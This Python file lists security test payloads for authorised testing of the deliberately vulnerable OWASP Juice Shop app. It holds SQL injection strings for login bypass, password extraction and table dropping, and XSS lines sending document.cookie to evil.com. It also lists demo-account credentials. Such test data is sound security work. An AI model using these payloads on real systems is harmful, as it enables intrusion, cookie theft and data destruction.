"""
Security test payloads organized by vulnerability type.

These payloads are used for authorized testing against OWASP Juice Shop
running in a local Docker container. Never use against production systems.
"""

# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------

SQLI_LOGIN_BYPASS: list[str] = [
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "' OR ''='",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "'; DROP TABLE Users--",
]

SQLI_SEARCH: list[str] = [
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' OR 1=1--",
    "qwert')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--",
    "1' AND SLEEP(3)--",
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
]

# ---------------------------------------------------------------------------
# Cross-Site Scripting (XSS)
# ---------------------------------------------------------------------------

XSS_REFLECTED: list[str] = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "javascript:alert('xss')",
    "<body onload=alert('xss')>",
    "\"><script>alert('xss')</script>",
    "'-alert('xss')-'",
]

XSS_STORED: list[str] = [
    "<iframe src=\"javascript:alert('xss')\">",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<img src=x onerror=\"fetch('http://evil.com/?c='+document.cookie)\">",
    "<b onmouseover=alert('xss')>hover me</b>",
]

# ---------------------------------------------------------------------------
# Authentication / Password
# ---------------------------------------------------------------------------

WEAK_PASSWORDS: list[str] = [
    "123",
    "password",
    "1234",
    "abc",
    "a",
    "",
]

COMMON_CREDENTIALS: list[dict[str, str]] = [
    {"email": "admin@juice-sh.op", "password": "admin123"},
    {"email": "admin@juice-sh.op", "password": "password"},
    {"email": "admin@juice-sh.op", "password": "admin"},
    {"email": "jim@juice-sh.op", "password": "ncc-1701"},
    {"email": "bender@juice-sh.op", "password": "OhG0dPlease1nsique"},
]

# ---------------------------------------------------------------------------
# Security Headers – expected values
# ---------------------------------------------------------------------------

REQUIRED_SECURITY_HEADERS: dict[str, str | None] = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": None,  # any value accepted (DENY or SAMEORIGIN)
    "Content-Security-Policy": None,
    "Strict-Transport-Security": None,
    "X-XSS-Protection": None,
    "Referrer-Policy": None,
}

# ---------------------------------------------------------------------------
# CORS – origins to test
# ---------------------------------------------------------------------------

CORS_ORIGINS: list[str] = [
    "http://evil.com",
    "http://attacker.example.org",
    "null",
    "http://localhost:9999",
]
